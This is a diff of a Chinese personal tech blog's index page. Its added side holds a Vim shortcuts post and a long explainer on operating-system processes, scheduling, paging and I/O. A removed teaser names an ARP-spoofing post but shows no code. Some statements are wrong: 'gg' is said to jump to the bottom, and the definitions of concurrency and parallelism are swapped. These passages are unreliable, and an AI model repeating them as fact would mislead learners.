@@ -1,45 +1,1140 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><title>zen's blog</title><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><meta http-equiv="X-UA-Compatible" content="IE=Edge，chrome=1"><meta name="description"><meta name="keywords"><meta name="author" content="ZEN"><link rel="short icon" href="../../images/favicon.png"><link rel="icon" href="../../images/favicon.png"><!--[if lt IE 9]>
-<script src="../../js/modernizr.js"></script>
-<![endif]-->
-<link rel="stylesheet" href="../../css/iconfont.css">
+<!doctype html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
+    <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
+    
+    <title>zen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
+    <meta name="keywords" content="Jelon, 前端, Web, 张德龙, 前端开发" >
+    <meta name="description" content="Jelon个人前端小站" >
 
-<link rel="stylesheet" href="../../css/index.css?v=202006181108.css">
-<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="atom.xml" title="zen's blog" type="application/atom+xml">
-</head><body><header id="header" class="header-navigation"><nav><div class="logo"><a href="http://ymlog.cn">zen's blog</a></div><h2 id="mnavh"><span class="navicon"></span></h2><ul id="starlist"><li><a href="../../index.html">首页</a></li><li><a href="../../time.html">时间轴</a></li></ul><div class="searchbox"><div id="search_bar" class="search_bar"><input id="keyboard" placeholder="想搜点什么呢.." type="text" name="keyboard" autocomplete="off" class="input"><p class="search_ico"><span></span></p></div></div></nav></header><article><main><div class="blogtab"><div data-scroll-reveal="enter bottom over 1s" class="blogs"><h3 class="blogtitle"><a href="../../2019/10/21/Python%E7%88%AC%E8%99%AB%E5%A4%A7%E7%BA%B2%E6%A6%82%E8%BF%B0/" target="_blank">Python爬虫大纲概述</a></h3><span class="blogpic"><a href="../../2019/10/21/Python%E7%88%AC%E8%99%AB%E5%A4%A7%E7%BA%B2%E6%A6%82%E8%BF%B0/" title="Python爬虫大纲概述"><img src="../../https:/i.loli.net/2020/03/22/DwAiXksFToEfvcJ.jpg" alt=""></a></span><p class="blogtext">基本原理爬虫的本质是：程序模拟浏览器，对服务器发起访问(requests请求过程)，服务器返回响应(response响应过程)。所以，一个简单的爬虫只有三步：
+    
+    <link rel="alternative" href="/atom.xml" title="zen&#39;s blog" type="application/atom+xml" >
+    
+    
+    <link rel="shortcut icon" href="../../favicon.ico" >
+    
+    
+<link rel="stylesheet" href="../../css/style.css">
 
-构造URL
-对服务器发送请求
-输出服务器返回内容
+    <!--[if lt IE 9]>
+    
+<script src="../../js/html5.js"></script>
+
+    <![endif]-->
+    
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d5ebf515ab530cfbdda5f5c85093fb41";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
 
 
-这里用一个实例，运...</p><div class="bloginfo"><ul><li class="author"><a href="/">ZEN</a></li><li class="lmname"><a href="../../categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="timer">2019-10-21 12:37:03</li><!--li.view--><!--    span 34567--><!--    | 已阅读--><!--li.like 9999--></ul></div></div><div data-scroll-reveal="enter bottom over 1s" class="blogs"><h3 class="blogtitle"><a href="../../2019/10/10/Vim%E5%BF%AB%E6%8D%B7%E9%94%AE/" target="_blank">Vim快捷键</a></h3><span class="blogpic"><a href="../../2019/10/10/Vim%E5%BF%AB%E6%8D%B7%E9%94%AE/" title="Vim快捷键"><img src="../../https:/s1.ax1x.com/2020/06/16/NkExXj.png" alt=""></a></span><p class="blogtext">
-j：向下滚动一点
-k：向上滚动一点
-gg：到页面最底部
-G：到页面最底部
-d：向下翻一屏
-u：向上翻一屏
+<meta name="generator" content="Hexo 4.2.0"></head>
 
-常用命令
-1、批量加注释ctrl + v，进入可视块模式
+<body class="home">
+    <!--[if lt IE 9]>
+    <div class="browsehappy">
+        当前网页 <strong>不支持</strong>
+        你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/" target="_blank" rel="noopener">升级你的浏览器</a>.
+    </div>
+    <![endif]-->
+
+    <!-- 博客头部 -->
+    <header class="header">
+    <section class="container header-main">
+        <div class="logo">
+            <a href="../../index.html">
+                <div class="cover">
+                    <span class="name">zen&#39;s blog</span>
+                    <span class="description"></span>
+                </div>
+            </a>
+        </div>
+        <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
+        <ul class="menu hidden" id="JELON__menu">
+            
+            <li rel="" class="item ">
+                <a href="../../index.html" title="首页" class="icon-home">&nbsp;首页</a>
+            </li>
+            
+            <li rel="" class="item ">
+                <a href="../../lab/" title="实验室" class="icon-lab">&nbsp;实验室</a>
+            </li>
+            
+            <li rel="" class="item ">
+                <a href="../../about/" title="关于" class="icon-about">&nbsp;关于</a>
+            </li>
+            
+            <li rel="" class="item ">
+                <a href="../../comment/" title="留言" class="icon-comment">&nbsp;留言</a>
+            </li>
+            
+        </ul>
+        <div class="profile clearfix">
+            <div class="feeds fl">
+                
+                
+                <p class="links">
+                    
+                        <a href="https://github.com/jangdelong" target="_blank">Github</a>
+                        |
+                    
+                        <a href="https://pages.coding.me" target="_blank">Hosted by Coding Pages</a>
+                        
+                    
+                </p>
+                <p class="sns">
+                    
+                        <a href="http://weibo.com/jangdelong" class="sinaweibo" target="_blank"><b>■</b> 新浪微博</a>
+                    
+                        <a href="https://www.facebook.com/profile.php?id=100011855760219&amp;ref=bookmarks" class="qqweibo" target="_blank"><b>■</b> Facebook</a>
+                    
+                    <a href="javascript: void(0);" class="wechat">
+                        <b>■</b>
+                        公众号
+                        <span class="popover">
+                            <img src="../../img/wechat_mp.jpg" width="120" height="120" alt="我的微信订阅号">
+                            <i class="arrow"></i>
+                        </span>
+                    </a>
+                </p>
+                
+            </div>
+            <div class="avatar fr">
+                <img src="/img/jelon.jpg" alt="avatar" title="Jelon" >
+            </div>
+        </div>
+    </section>
+</header>
+
+
+    <!-- 博客正文 -->
+    <div class="container body clearfix">
+        <section class="content">
+            <div class="content-main widget">
+                <!-- 首页 -->
+
+    
+    <h3 class="widget-hd">
+        <strong>
+            
+                最近动态
+            
+        </strong>
+    </h3>
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+            <a href="javascript: void(0);" class="cat">未分类</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="../../http:/ymlog.cn/2019/10/10/Vim%E5%BF%AB%E6%8D%B7%E9%94%AE/">
+    		Vim快捷键
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2019-10-10T13:13:51.000Z">2019-10-10</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="../../tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/" title="快捷键">快捷键</a>
+    
+
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <h1 id=""><a href="#" class="headerlink" title=""></a></h1><ul>
+<li>j：向下滚动一点</li>
+<li>k：向上滚动一点</li>
+<li>gg：到页面最底部</li>
+<li>G：到页面最底部</li>
+<li>d：向下翻一屏</li>
+<li>u：向上翻一屏</li>
+</ul>
+<p>常用命令</p>
+<h1 id="1、批量加注释"><a href="#1、批量加注释" class="headerlink" title="1、批量加注释"></a>1、批量加注释</h1><pre><code>ctrl + v，进入可视块模式
 移动光标，选中的位置会有高亮显示
-shift + i，进入 ins...</p><div class="bloginfo"><ul><li class="author"><a href="/">ZEN</a></li><li class="lmname"><a href="../../index.html"></a></li><li class="timer">2019-10-10 21:13:51</li><!--li.view--><!--    span 34567--><!--    | 已阅读--><!--li.like 9999--></ul></div></div><div data-scroll-reveal="enter bottom over 1s" class="blogs"><h3 class="blogtitle"><a href="../../2019/08/22/OS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" target="_blank">OS操作系统</a></h3><span class="blogpic"><a href="../../2019/08/22/OS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" title="OS操作系统"><img src="../../https:/i.loli.net/2020/03/22/yLUwC4eDp1jS6Nv.png" alt=""></a></span><p class="blogtext">简介Operation System 是系统资源的管理者，在有限的资源内，通过算法，完成相对合理的分配。在复杂的硬件环境中，通过封装，完成动作指令的抽象化。这一切的基石，则是密集的数据结构和算法。
-相对合理体现在：
+shift + i，进入 insert 模式
+输入//
+esc</code></pre><h1 id="2、批量解注释"><a href="#2、批量解注释" class="headerlink" title="2、批量解注释"></a>2、批量解注释</h1><pre><code>解注释
+光标置于行首
+ctrl + v，进入可视块模式
+移动光标，选中的位置会有高亮显示
+按d</code></pre><h1 id="3、删除"><a href="#3、删除" class="headerlink" title="3、删除"></a>3、删除</h1><pre><code>命令行模式：:%d 删除所有内容
+末行模式：dG：删除光标下所有内容
+dw：删除一个单词</code></pre><h1 id="4、移动"><a href="#4、移动" class="headerlink" title="4、移动"></a>4、移动</h1><pre><code>gg：光标移到第一行
+G：光标移到最后一行
+9k  向上移动9次，同理num hjkl</code></pre><h1 id="5、退出"><a href="#5、退出" class="headerlink" title="5、退出"></a>5、退出</h1><pre><code>ZZ 保存并退出，行末模式</code></pre><h1 id="6、括号跳转"><a href="#6、括号跳转" class="headerlink" title="6、括号跳转"></a>6、括号跳转</h1><pre><code>%</code></pre><h1 id="7、滚屏"><a href="#7、滚屏" class="headerlink" title="7、滚屏"></a>7、滚屏</h1>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CTRL-U：窗口向上滚动半屏</span><br><span class="line">CTRL-D：窗口向下滚动半屏</span><br><span class="line">CTRL-F：窗口向下滚动全屏</span><br><span class="line">CTRL-B：窗口向上滚动全屏</span><br><span class="line">zz    ：窗口正中</span><br><span class="line">zt    ：将最下面的窗口调到最上面</span><br><span class="line">zb    ：将最上面的窗口调到最下面</span><br></pre></td></tr></table></figure>
 
-调度算法实现的低...</p><div class="bloginfo"><ul><li class="author"><a href="/">ZEN</a></li><li class="lmname"><a href="../../categories/Linux/">Linux</a></li><li class="timer">2019-08-22 14:45:18</li><!--li.view--><!--    span 34567--><!--    | 已阅读--><!--li.like 9999--></ul></div></div><div data-scroll-reveal="enter bottom over 1s" class="blogs"><h3 class="blogtitle"><a href="../../2019/08/20/%E7%A6%85/" target="_blank">禅</a></h3><span class="blogpic"><a href="../../2019/08/20/%E7%A6%85/" title="禅"><img src="../../https:/i.loli.net/2019/08/25/QtSnA4aeXB7WlNu.jpg" alt=""></a></span><p class="blogtext">&emsp;&emsp; 释迦牟尼原名乔达摩·悉达多，是古印度迦毗罗卫国（今尼泊尔）的太子，悉达多太子天资聪慧，长到12岁时，就已经掌握了当时印度最高的学问，16岁时，娶了表妹耶输陀罗为妻。
-&emsp;&emsp; 他有一次驾车出城...</p><div class="bloginfo"><ul><li class="author"><a href="/">ZEN</a></li><li class="lmname"><a href="../../index.html"></a></li><li class="timer">2019-08-20 00:00:00</li><!--li.view--><!--    span 34567--><!--    | 已阅读--><!--li.like 9999--></ul></div></div><div data-scroll-reveal="enter bottom over 1s" class="blogs"><h3 class="blogtitle"><a href="../../2019/07/27/Python%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97%E5%B1%8F%E8%94%BD%E5%B1%80%E5%9F%9F%E7%BD%91/" target="_blank">Python实现ARP欺骗屏蔽局域网</a></h3><span class="blogpic"><a href="../../2019/07/27/Python%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97%E5%B1%8F%E8%94%BD%E5%B1%80%E5%9F%9F%E7%BD%91/" title="Python实现ARP欺骗屏蔽局域网"><img src="../../https:/cn.bing.com/th?id=OIP.IggedWLuhRIL9ANmGGDltQHaEz&amp;pid=Api&amp;rs=1" alt=""></a></span><p class="blogtext">Arp欺骗 ---- Python实现
+
+
+<h1 id="8、查找"><a href="#8、查找" class="headerlink" title="8、查找"></a>8、查找</h1><pre><code>/string
+#查找后
+‘#’ ：往上查找
+‘*’：往下查找
+/the\&gt; 精确查找，确保以&apos;the&apos;结尾。&apos;\&lt;&apos;:开头，&apos;\&gt;&apos;：结尾</code></pre><h1 id="9、多屏编辑"><a href="#9、多屏编辑" class="headerlink" title="9、多屏编辑"></a>9、多屏编辑</h1><pre><code>vim a.sh b.sh -O #垂直
+
+Ctrl+w：跳转
+qall!:前置退出所有</code></pre><h1 id="10、替换"><a href="#10、替换" class="headerlink" title="10、替换"></a>10、替换</h1><pre><code>s/{word1}/{word2}/g : 将光标所在行的所有word1替换为word2
+%s/{word1}/{word2}/g : 将所有word1替换为word2
+g表示全局替换
+i表示大小写不敏感，I表示大小写敏感
+如：
+    %s/sudo/su/ig</code></pre><h1 id="行末模式"><a href="#行末模式" class="headerlink" title="行末模式"></a>行末模式</h1><pre><code>a    光标所在下一个位置插入
+A    光标所在行末尾插入
+i    光标所在位置插入
+I    光标所在行首插入
+o    光标所在下一行插入
+O    光标所在上一行插入
+
+y   复制
+p   粘贴
+dd  删除一行
+u   撤销</code></pre><h1 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h1><pre><code>#设置行号
+set nu   
+#取消行号                  
+set nonu 
+#下划线              
+set cursorline     
+#Tab=2个空格
+set ts=2
+#忽略大小写
+set ignorecase
+#不忽略大小写
+set noignorecase</code></pre><h1 id="输入模式"><a href="#输入模式" class="headerlink" title="输入模式"></a>输入模式</h1><h1 id="定制vim"><a href="#定制vim" class="headerlink" title="定制vim"></a>定制vim</h1><blockquote>
+<p>配置文件：全局有效<br>全局：/etc/vimrc<br>个人：~/.vimrc<br>行末：对当前进程有效</p>
+</blockquote>
+<p>相关配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">行号：</span><br><span class="line">  显示：<span class="built_in">set</span> nu</span><br><span class="line">  取消：<span class="built_in">set</span> nonu</span><br><span class="line">括号匹配：</span><br><span class="line">  匹配：<span class="built_in">set</span> showmatch</span><br><span class="line">  取消：<span class="built_in">set</span> unshowmatch</span><br><span class="line">自动缩进：</span><br><span class="line">  启动  <span class="built_in">set</span> ai</span><br><span class="line">  取消：  <span class="built_in">set</span> noai</span><br><span class="line">高亮搜索：</span><br><span class="line">  启动 <span class="built_in">set</span> hlsearch</span><br><span class="line">  取消 <span class="built_in">set</span> nohlsearch</span><br><span class="line">语法高亮</span><br><span class="line">  启动 syntax on</span><br><span class="line">  取消 syntax off</span><br><span class="line">忽略大小写</span><br><span class="line">  启动 <span class="built_in">set</span> ic</span><br><span class="line">  取消 <span class="built_in">set</span> noic</span><br><span class="line">获取帮助：</span><br><span class="line">  <span class="built_in">help</span></span><br></pre></td></tr></table></figure>
+
+            
+            <p class="more">
+                <a href="../../http:/ymlog.cn/2019/10/10/Vim%E5%BF%AB%E6%8D%B7%E9%94%AE/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="http://ymlog.cn/2019/10/10/Vim%E5%BF%AB%E6%8D%B7%E9%94%AE/" title="Vim快捷键">
+                
+                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/0.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+        <a class="cat-link" href="../../categories/Linux/">Linux</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="../../http:/ymlog.cn/2019/08/22/OS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">
+    		OS操作系统
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2019-08-22T06:45:18.000Z">2019-08-22</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Operation System 是系统资源的管理者，在有限的资源内，通过算法，完成相对合理的分配。在复杂的硬件环境中，通过封装，完成动作指令的抽象化。这一切的基石，则是密集的数据结构和算法。</p>
+<p>相对合理体现在：</p>
+<ul>
+<li>调度算法实现的低用户响应时间和紧急事件处理</li>
+<li>虚拟技术实现多用户登录</li>
+<li>IO设备控制器尽可能减少CPU调度</li>
+<li>文件目录系统屏蔽了数据写入物理块的底层细节</li>
+<li>命令接口、图形接口的封装</li>
+</ul>
+<h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><ul>
+<li>并发：在多台处理器上同时处理多个任务</li>
+<li>并行：在一台处理器上宏观上同时处理多个任务，微观上一个时间段只处理一个任务</li>
+<li>并发进程的制约关系：同步和互斥</li>
+<li>同步：同步亦称直接制约关系，它是指为完成某种任务而建立的两个或多个进程，这些进程因为需要在某些位置上协调它们的工作次序而等待、传递信息所产生的制约关系。进程间的直接制约关系就是源于它们之间的相互合作。</li>
+<li>互斥：互斥亦称间接制约关系。当一个进程进入临界区使用临界资源时，另一个进程必须等待, 当占用临界资源的进程退出临界区后，另一进程才允许去访问此临界资源。</li>
+<li>异步：异步是进程之间彼此独立，在等待其他进程的运行时，本进程继续做自己的事，不需要等待其他进程完成后再工作。</li>
+<li>临界资源：一次仅允许一个进程使用的资源</li>
+<li>管程：管程在功能上和信号量及PV操作类似，属于一种进程同步互斥工具</li>
+<li>符号链接：是文件共享的一种方式，允许一个文件或子目录有多个父目录，但其中仅有一个座位主父目录，但其他几个父目录都是通过符号链接方式与之相连。</li>
+<li>索引结点实现文件共享：在文件目录中只设置文件名以及指向相应索引结点的指针，源文件删除后，会出现悬空指针。</li>
+<li>工作集：是指在某段时间间隔 ∆ 里，进程实际要访问的页面的集合。</li>
+<li>抖动：如果多道程度过高，页面在内存与外存之间频繁调度，以至于调度页面所需时间比进程实际运行的时间还多，此时系统效率急剧下降，甚至导致系统崩溃。这种现象称为颠簸或抖动(thrashing)</li>
+</ul>
+<h2 id="相关技术"><a href="#相关技术" class="headerlink" title="相关技术"></a>相关技术</h2><ul>
+<li>虚拟技术</li>
+<li>复用技术</li>
+<li>中断技术</li>
+<li>封装技术</li>
+</ul>
+<h2 id="相关算法"><a href="#相关算法" class="headerlink" title="相关算法"></a>相关算法</h2><ul>
+<li>双标志后检查法</li>
+<li>记录型信号量机制</li>
+<li>先来先服务算法(First Come First Serve)</li>
+<li>短作业优先(Shortest Job First)</li>
+<li>高响应比优先(Highest Response Ratio Next)</li>
+<li>时间片轮转调度(Round Robin)</li>
+<li>优先级调度算法</li>
+<li>多级反馈调度算法</li>
+</ul>
+<br>
+
+<hr>
+<br>
+
+<h2 id="一个进程从被创建到终止，其中不得不说的故事"><a href="#一个进程从被创建到终止，其中不得不说的故事" class="headerlink" title="一个进程从被创建到终止，其中不得不说的故事"></a>一个进程从被创建到终止，其中不得不说的故事</h2><p>&emsp;&emsp; 当我们打开一个程序。这个程序就会被执行。因为CPU速度非常快，普通硬盘的读写速度跟不上CPU的速度，所以我们会把程序调入内存中执行，这样就产生了进程。</p>
+<p>&emsp;&emsp; 如果我们同时打开多个应用，就会产生多个进程，在宏观上每一个进程在CPU内同时执行(并发)，微观上每个进程在CPU内交替执行，同一个处理机同一时间内只能执行一个进程(并行)。</p>
+<p>&emsp;&emsp; 由于人们的需求不一样，希望有些应用执行的更快一点，就此产生了进程的优先级。但在处理机调度算法中，优先级只是决定一个进程能够被分到多少运行时间的指标之一，还有其他的指标，诸如：CPU利用率(CPU忙碌的时间 / 作业被处理所需要的总时间)，系统吞吐量(单位时间内完成作业的数量)，周转时间(作业从被提交给系统到最后完成所用时间)，响应时间(用户提出请求到首次响应所用的时间，简而言之，就是你点击一个应用，系统过了多个才给你打开)，这些也是衡量一个处理机调度算法优劣的指标。</p>
+<p>&emsp;&emsp; 截止到现在，你还是只点了一下应用，电脑界面还什么都没有发生。当你点下鼠标的那一刻，该应用(下文全部用作业来代替)会被装入到内存，但是并不是全部被装入内存，比如打开英雄联盟，它只会将加载页面放入内存，而不会把对战地图放入内存，这样有一个好处就是，原本8G的League of Legends,现在只需要不到4G就可以带动了。</p>
+<p>&emsp;&emsp;当一个作业被装入内存，会有模块链接的相关步骤，但现代操作系统一般采用运行时动态链接，即程序执行过程中需要改模块时，才对它进行链接。而在以前，则采用静态链接，即在程序运行之前，先将各个目标模块及它们所需的库函数连接成一个完整的可执行文件（装入模块），之后不再拆开。所以这一步不再是程序执行的第一步了，写到这，程序执行的第一步即将开始，那就是动态重定位装入。</p>
+<p>&emsp;&emsp;装入就是将作业装入内存，其中涉及到很多东西，比如内存如何分配给作业、作业执行完之后如何回收内存、当作业太大时内存如何扩展等。先看最开始的——如何分配内存给作业。</p>
+<p>&emsp;&emsp;现在操作系统一般采用离散分配的方式，就是将作业拆成很多块，同时将内存拆成很多块，按照非连续的方式，将作业放入内存。这样可以产生较少的空间碎片。一般的分配机制采取分页存储管理、分段存储管理或者段页存储管理。这时候，我们的LOL的一部分(可能是登录界面)，已经被拆成很多块，塞到内存页中了。下一步就是交给CPU执行了，但其实还缺少了一步——进程创建。我们一直在将它如何进入内存，却忘了给它创建进程，但现在也为时不晚。</p>
+<p>&emsp;&emsp;进程创建首先要向操作系统申请空白的PCB(Process Control Block)，获得唯一标识符UID，然后是分配资源，毕竟进程是系统资源调度的最小单位，而线程则是处理机调度的最小单位。接着初始化PCB信息初始化处理机状态信息 ：使程序计时器指向程序的入口地址，使指针指向栈项，初始化处理机控制信息 ：设置进程状态为就绪或者静止就绪，优先级默认为最低。最后终于可以将进程插入就绪队列，只等处理机调度了。虽然程序已经做了这么多事，但现在用户还是什么也看不到，当用户第一次看到反应的时候，就是用户响应时间(前面提到过的处理机调度算法的指标)</p>
+<p>&emsp;&emsp;这个时候可以谈一谈处理机如何调度进程的，这个就是进程切换。得益于优秀的数据结构，处理机实现进程切换只需要把PCB(进程控制模块)中的相关数据进行修改。比如一个进程从运行态切换为阻塞态，处理机会根据进程标识符UID，读取进程状态，将进程PCB中的状态信息修改从运行修改为阻塞，同时将运行环境信息存入该进程的PCB中，再把该进程移到阻塞队列队尾，选择下一个就绪队列的进程，读取其PCB中CPU的运行环境，然后恢复运行环境，开始执行这个进程，类似同时和多个人聊微信时的状态。这里会产生一个问题，进程并不是平等的，操作系统会希望一些进程执行的更快，一些则无所谓。这就像同时和多个人聊微信，对女朋友所化的时间总是会比其他人多，因为有一些人、或是进程的优先级总是高于其他。这就涉及到了处理机调度算法，这里只介绍两种算法。</p>
+<p>&emsp;&emsp;处理机调度算法是为了更高的I/O，更快的响应时间，以及更多的CPU利用率等等。</p>
+<ul>
+<li>时间片轮转调度算法(Round Robin)</li>
+</ul>
+<p>&emsp;&emsp;这种算法把时间切片，比如在一分钟内有三个进程运行。处理机划分时间片为100ms，每隔100ms切换一次进程。</p>
+<pre><code>000~100ms：执行进程A1
+100~200ms：执行进程A2
+200~300ms：执行进程A3
+300~400ms：执行进程A1
+400~500ms：执行进程A2
+500~600ms：执行进程A3
+........</code></pre><ul>
+<li>多级反馈调度算法</li>
+</ul>
+<p>&emsp;&emsp;(说实话，写到这里我已经不想写了，为什么我们的程序还没执行)</p>
+<p><img src="https://i.loli.net/2019/10/21/6CA9hEJvWGRFQzB.png" alt="多级反馈调度算法"></p>
+<p>&emsp;&emsp;该算法划分了多个优先级就绪队列以及多种时间片大小，优先级越高，时间片越小。当一个进程产生时，先到优先级最高的就绪队列执行一个时间片，如果作业没有执行完，那么就进入下一个优先级次一级的队列，这时候进来的进程仍然送往第一优先级队列，执行一个时间片，然后送往第二优先级队列。如果此时没有进程，则执行第二优先级队列。如果作业还没有执行完，则放入第三优先级队列。</p>
+<p>总结：</p>
+<pre><code>1、设置多级就绪队列，各级队列优先级从高到低、时间片从小到大
+2、新进程到达时，先进入一级队列，运行结束后进入下一级队列队尾，到了最下一级，就重新放回该队列队尾
+3、只有第k级为空，才会为k+1级队列分配时间片</code></pre><p>优点：</p>
+<pre><code>1、对各类进程相对公平（FCFS的优点）
+2、每个进程到达都可以很快的得到响应（RR优点）
+3、短进程只用较少的时间就可以完成（SPF优点）
+4、不必实现估计进程的运行时间（避免用户作假）
+5、灵活的调整对各类进程的偏好程度，I/O密集型进程（将因I/O阻塞的进程重新放回队列）</code></pre><p>&emsp;&emsp;我们的游戏此时还在就绪队列，可能就在多级反馈调度算法的第一个队列中。之后，该进程就会被安排上处理机执行。在执行的过程中还会发生一件事，比如你进入了游戏，需要加载地图界面，这时候，操作系统就会发生缺页中断，缺页中断就是要访问的页不在主存，需要操作系统将其调入主存后再进行访问。缺页中断、请求调页和页面置换是实现分页请求功能的三个步骤。</p>
+<pre><code>请求分页也称为页式虚拟存储管理，是建立在基本分页基础上，为了能支持虚拟存储器功能而增加了请求调页功能和页面置换功能其基本思想是：在进程开始运行之前，不是装入全部页面，而是装入部分页面，之后根据进程运行的需要，动态装入其他页面，当内存空间已满，又需要装入新的页面时，根据某种算法淘汰某个页面，以便装进新的页面。</code></pre><p>&emsp;&emsp;实现请求分页，就需要解决两个问题——调出和调入。调出调哪里的页面？</p>
+<p>调出</p>
+<pre><code>现代操作系统一般采用可变分配全局置换，进程缺页时，只允许该进程在内存的页面中选择一页换出，这样就不会影响其他进程运行，如果该进程在运行过程中频繁的中断，系统再为该进程分配若干物理块。</code></pre><p>调入</p>
+<pre><code>将请求分页系统的外存分为两步分，用于存放文件区和用于存放对换页面的对换区。通常，对换区采取连续分配的方式。如果系统有足够的空间，可以全部从对换区调入所需页面。如果系统缺少足够的对换区空间，这时，凡是不会被修改的文件，都直接从文件区调入；而当换出这些页面时，由于未被修改，所以不必再将他们换出。对于那些会被修改的文件，则将他们调出时，便调到对换区，需要时，再从对换区调入。</code></pre><p>页面调入的过程</p>
+<pre><code>--程序所要访问的页面不在内存
+--CPU发出缺页中断
+--中断处理程序保留CPU环境，分析中断原因，转入中断处理
+--查号页表，得到该页的外存地址
+判断
+IF {内存能容纳新页}:
+    启动I/O,将所缺页调入，并修改页表
+ELSE {内存满了}:
+    按照某种置换算法，从内存中选取一页准备换出
+判断    
+    IF {准备换出的这一页没有被修改过}:
+        不必写入磁盘
+    ELSE {修改过}:
+        则必须写入磁盘
+--然后把所缺页调入内存，并修改页表中相应的值。</code></pre><p>&emsp;&emsp;以上实现了操作系统的虚拟化存储，以便于去执行那些内存大的程序。当操作系统产生了一个作业的执行结果，它会将执行的结果通过I/O设备传输给用户，简而言之就是屏幕。那么操作系统是如何通过屏幕让用户看到的呢？而且我们玩的过程中所敲的QWERDF是如何被操作系统识别的呢？这个就设计到了操作系统的IO管理。I/O管理系统可以让我们不用关心一个当我们敲下一个字符的时候，计算机是怎么接受、怎么处理以及怎么显示在我们希望它显示的位置，但学习计算机一定会了解I/O管理系统。</p>
+<p>&emsp;&emsp;一般I/O设备是不会直接和CPU进行通信的，因为这样会大量占用CPU的资源，总不可能你在键盘上输入一个字符，就直接通过I/O设备进入到CPU中。为了提高CPU的利用率，I/O系统在I/O设备和CPU通信之间设置了中间件，这就是设备控制器</p>
+<p><img src="https://i.loli.net/2020/01/17/PqIxotaAkcMnhiV.png" alt="Device_Control.png"></p>
+<p>&emsp;&emsp;键盘鼠标等输入输出设备现将内容传输给设备控制器的缓冲区，缓冲区积累一定的量之后，由设备控制器向CPU发送一个中断指令，CPU保存其运行环境，然后和设备控制器进行通信。至此，你所敲下的信息被操作系统所认知。接下来就是CPU将接受到的信息进行处理，将最终结果返还给用户，下面是处理过程。</p>
+<p>&emsp;&emsp;操作系统是一个庞大的进程合集，一个进程需要将自己的数据传输给其他进程，比如说当你在网页上复制一段下载链接时，后台的迅雷就会自动跳出来。这就是进程间通信，通俗一点就是进程间信息的传递。进程通信存在同步(同步和互斥)和异步两种方式。而进程间通信的具体实现主要是以下三种方式：</p>
+<p>1、共享存储</p>
+<pre><code>设置一个共享空间
+互斥的访问共享空间
+两种方式：基于数据结构、基于存储区的共享</code></pre><p>2、管道通信</p>
+<pre><code>设置一个特殊的共享文件（管道），其实就是一个缓冲区
+一个管道只能实现半双工通信
+实现双向同时通信要建立两个管道
+各进程要互斥的访问管道
+写满时，不能再写，读空时，不能再读
+没写满，不能读，没读空，不能写</code></pre><p>3、消息传递</p>
+<pre><code>传递结构化的消息（消息头/消息体）
+系统提供“发送/接受原语”
+两种方式
+    直接通信方式：消息直接挂到接收方的消息队列里
+    间接（信箱）通信方式：消息先发到中间体（信箱）</code></pre><br>
+&emsp;&emsp;通过进程间通信，就可以将消息传递给其他程序，其他程序再讲消息传递给设备控制器，设备控制器将数据输出到屏幕，至此一个基本的操作系统成型。
+
